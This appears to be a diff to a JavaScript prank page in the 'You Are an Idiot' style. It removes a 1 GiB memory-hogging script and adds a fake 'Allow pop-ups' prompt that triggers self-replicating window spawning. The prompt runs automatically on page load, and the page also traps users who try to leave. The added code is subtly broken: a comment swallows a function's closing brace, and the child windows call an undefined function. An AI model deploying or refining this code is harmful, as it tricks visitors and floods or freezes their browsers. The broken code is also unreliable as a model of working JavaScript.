@@ -43,6 +43,8 @@ function changeTitle(title) {
     document.title = title;
 }
 
+
+
 function openWindow(url) {
     var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 
@@ -60,14 +62,10 @@ function openWindow(url) {
         newWin.document.write(`
             <html>
             <head>
-                <script src="you.js"></script>
                 <title>YOU ARE AN IDIOT</title>
                 <style>
                     body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                 </style>
-                <script>
-                    const x = new Uint8Array(1024 * 1024 * 1024 * 1).fill(255); // 1GiB
-                </script>
             </head>
             <body>
                 <h1>You are an IDIOT!</h1>
@@ -111,10 +109,85 @@ window.onbeforeunload = function () {
     return "Are you an idiot?";
 };
 
+
+function requestPopUpPermission() {
+    var popUpWin = window.open("about:blank", "_blank", "width=400,height=200");
+
+    if (popUpWin) {
+        popUpWin.document.write(`
+            <html>
+            <head><title>Allow Pop-ups</title></head>
+            <body style="text-align:center; font-family:sans-serif;">
+                <h2>Allow pop-ups & redirects!</h2>
+                <button id="start">OK</button>
+                <script>
+                    document.getElementById('start').onclick = function() {
+                        window.opener.startChaos();
+                        window.close();
+                    };
+                </script>
+            </body>
+            </html>
+        `);
+        popUpWin.document.close();
+    }
+}
+
+// Function to spawn windows infinitely
+function startChaos() {
+    function openSelfReplicatingWindow() {
+        var newWin = window.open("about:blank", "_blank", 'width=357,height=330');
+
+        if (newWin) {
+            var screenWidth = screen.width - 357;
+            var screenHeight = screen.height - 330;
+            var randomX = Math.floor(Math.random() * screenWidth);
+            var randomY = Math.floor(Math.random() * screenHeight);
+
+            newWin.moveTo(randomX, randomY);
+
+            // Inject HTML + self-replicating script
+            newWin.document.write(`
+                <html>
+                <head>
+                    <title>You Are an Idiot!</title>
+                    <style>
+                        body { background: yellow; color: black; text-align: center; font-size: 20px; margin-top: 100px; }
+                    </style>
+                </head>
+                <body>
+                    <h1>You are an IDIOT! 🤡</h1>
+                    <script>
+                        function spawnMore() {
+                            for (var i = 0; i < 3; i++) {
+                                var childWin = window.open("about:blank", "_blank", "width=357,height=330");
+                                if (childWin) {
+                                    childWin.document.write('<script>setTimeout(spawnMore, 1000);<\\/script>');
+                                    childWin.document.close();
+                                }
+                            }
+                        }
+                        setTimeout(spawnMore, 1000);
+                    </script>
+                </body>
+                </html>
+            `);
+
+            newWin.document.close();
+        }
+    }
+
+    // Start with a few windows
+    /*for (let i = 0; i < 3; i++) {
+        openSelfReplicatingWindow();
+    }
+}*/
+
+// Auto-run permission request on page load
+window.onload = requestPopUpPermission;
+
+
 // Self-executing function to start immediately
 (function () {
-    // Open new windows after 1 second
-    //setTimeout(function () {
         proCreate();
-    //}, 1000);
 })();
